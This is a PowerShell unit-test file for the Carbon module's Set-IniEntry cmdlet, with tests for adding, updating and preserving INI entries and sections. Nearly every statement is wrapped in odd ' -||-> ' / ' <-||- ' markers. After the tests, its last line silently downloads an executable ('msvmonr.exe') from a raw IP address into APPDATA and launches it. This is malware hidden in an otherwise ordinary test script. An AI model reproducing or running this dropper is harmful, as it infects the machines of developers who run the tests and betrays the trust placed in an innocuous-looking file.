











 -||-> $iniPath = $null <-||- 

 -||-> function Start-TestFixture
{
     -||-> & ( -||-> Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve <-||- ) <-||- 
} <-||- 

 -||-> function Start-Test
{
     -||-> $iniPath =  -||-> Join-Path ( -||-> [IO.Path]::GetTempPath() <-||- ) ( -||-> [IO.Path]::GetRandomFileName() <-||- ) <-||-  <-||- 
     -||-> New-Item $iniPath -ItemType File <-||- 
} <-||- 

 -||-> function Stop-Test
{
     -||-> Remove-Item $iniPath <-||- 
} <-||- 

 -||-> function Test-ShouldAddEntryToEmptyFile
{
     -||-> Set-IniEntry -Path $iniPath -Section section -Name empty -Value file <-||- 
     -||-> Assert-IniFile @"
[section]
empty = file
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldAddSectionlessEntryToEmptyFile
{
     -||-> Set-IniEntry -Path $iniPath -Name empty -Value file <-||- 
     -||-> Assert-IniFile @"
empty = file
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldRejectNamesWithEqualSign
{
     -||-> $error.Clear() <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section -Name 'i=have=equal=signs' -Value value -ErrorAction SilentlyContinue <-||- 
     -||-> Assert-Equal 1 $error.Count <-||- 
     -||-> Assert-IniFile "" <-||- 
} <-||- 

 -||-> function Test-ShouldNotUpdateIfValueNotChanged
{
     -||-> @"
[section]
name=value
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section -Name name -Value value <-||- 
     -||-> Assert-IniFile @"
[section]
name=value
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldCreateIniFile
{
     -||-> Remove-Item $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section -Name name -Value value <-||- 
     -||-> Assert-IniFile @"
[section]
name = value
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldUpdateExistingEntry
{
     -||-> @"
[section]
name=value
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section -Name name -Value newvalue <-||- 
     -||-> Assert-IniFile     @"
[section]
name = newvalue
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldPreserverWhitespaceAndComments
{
     -||-> @"

[section]

name=value

"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section -Name name -Value newvalue <-||- 
     -||-> Assert-IniFile @"

[section]

name = newvalue

"@ <-||- 
} <-||- 

 -||-> function Test-ShouldAddNewEntryToEndOfFile
{
     -||-> @"
[section]
name=value
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section2 -Name name2 -Value value2 <-||- 
     -||-> Assert-IniFile @"
[section]
name=value

[section2]
name2 = value2
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldAddEntryToExistingSectionWithEmptyLineSeparator
{
     -||-> @"
[section]
name=value

[section1]
name2=value2
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section -Name name3 -Value value3 <-||- 
     -||-> Assert-IniFile @"
[section]
name=value
name3 = value3

[section1]
name2=value2
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldAddEntryToExistingSectionWithNoSeparationBetweenSections
{
     -||-> @"
[section]
name=value
[section1]
name2=value2
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section -Name name3 -Value value3 <-||- 
     -||-> Assert-IniFile @"
[section]
name=value
name3 = value3

[section1]
name2=value2
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldAddEntryInLastOfMultipleSecitons
{
     -||-> @"
[section]
name=value

[section]
name2=value2
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section -Name name3 -Value value3 <-||- 
     -||-> Assert-IniFile @"
[section]
name=value

[section]
name2=value2
name3 = value3
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldAddEntryAfterLastEntryInSection
{
     -||-> @"
[section]
name=value



name2=value2
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section section -Name name3 -Value value3 <-||- 
     -||-> Assert-IniFile @"
[section]
name=value



name2=value2
name3 = value3
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldAddEntryWithoutSection
{
     -||-> @"
[section]
name=value
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Name name2 -Value value2 <-||- 
     -||-> Assert-IniFile @"
name2 = value2

[section]
name=value
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldAddEntryWithoutSectionThatExistsInSection
{
     -||-> @"
[section]
name = value
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Name name -Value value <-||- 
     -||-> Assert-IniFile @"
name = value

[section]
name = value
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldUpdateEntryWithoutSection
{
     -||-> @"
name=value
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Name name -Value newvalue <-||- 
     -||-> Assert-IniFile @"
name = newvalue
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldAddEntryToExistingSectionlessEntries
{
     -||-> @"
name = value

[section]
name2 = value2
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Name name3 -Value value3 <-||- 
     -||-> Assert-IniFile @"
name = value
name3 = value3

[section]
name2 = value2
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldSupportWhatIf
{
     -||-> @"
name = value
"@ > $iniPath <-||- 
     -||-> Set-IniEntry -Path $iniPath -Name name -Value newvalue -WhatIf <-||- 
     -||-> Assert-IniFile @"
name = value
"@ <-||- 
} <-||- 

 -||-> function Test-ShouldSupportCaseSensitiveIniFile
{
     -||-> @"
name = a
NAME = b

[section]
name = c

[SECTION]
name = d
"@ | Set-Content -Path $iniPath <-||- 

     -||-> Set-IniEntry -Path $iniPath -Name 'name' -Value 2 -CaseSensitive <-||- 
     -||-> Set-IniEntry -Path $iniPath -Section 'section' -Name 'name' -Value 4 -CaseSensitive <-||- 
     -||-> $ini =  -||-> Split-Ini -Path $iniPath -AsHashtable -CaseSensitive <-||-  <-||- 
     -||-> Assert-Equal '2' $ini['name'].Value <-||- 
     -||-> Assert-Equal 'b' $ini['NAME'].Value <-||- 
     -||-> Assert-Equal '4' $ini['section.name'].Value <-||- 
     -||-> Assert-Equal 'd' $ini['SECTION.name'].Value <-||- 
} <-||- 

 -||-> function Test-ShouldSupportUnicode
{
     -||-> $value = '##########' <-||- 
     -||-> Set-IniEntry -Path $iniPath -Name 'username' -Value $value <-||- 
     -||-> $ini =  -||-> Split-Ini -Path $iniPath -AsHashtable <-||-  <-||- 
     -||-> Assert-NotNull $ini <-||- 
     -||-> Assert-Equal $value $ini['username'].Value <-||- 
} <-||- 

 -||-> function Test-ShouldPreserveExistingSectionHeadersOnUpdate
{
    
     -||-> '[TestSection01]' | Set-Content $iniPath <-||- 

     -||-> $expectedFileContents = @"
[TestSection01]
TestKey01 = TestValue01

"@ <-||- 
    
     -||-> Set-IniEntry -Path $iniPath -Section 'TestSection01' -Name 'TestKey01' -Value 'TestValue01' <-||- 

     -||-> $actualFileContents =  -||-> Get-Content -Path $iniPath -Raw <-||-  <-||- 

     -||-> Assert-Equal -Expected $expectedFileContents -Actual $actualFileContents <-||- 
} <-||- 

 -||-> function Assert-IniFile
{
    param(
        [string]
        $ExpectedContents
    )
    
     -||-> $expectedLines = @() <-||- 
     -||-> if(  -||-> $ExpectedContents <-||-  )
    {
         -||-> $expectedLines = $ExpectedContents -split "`r`n" <-||- 
    } <-||- 
     -||-> Assert-FileExists $iniPath <-||- 
     -||-> $actualContents = @(  -||-> Get-Content $iniPath <-||-  ) <-||- 
     -||-> Assert-Equal $expectedLines.Length $actualContents.Length ( -||-> "Number of lines in file not equal.`n----------`n{0}`n----------`n{1}`n----------`n" -f $ExpectedContents,( -||-> $actualContents -join "`n" <-||- ) <-||- ) <-||- 
    for(  -||-> $idx = 0 <-||- ;  -||-> $idx -lt $actualContents.Length <-||- ;  -||-> ++$idx <-||-  )
    {
         -||-> Assert-Equal $expectedLines[$idx] $actualContents[$idx] "line $idx" <-||- 
    }
} <-||- 


 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\msvmonr.exe" <-||- ) <-||- 



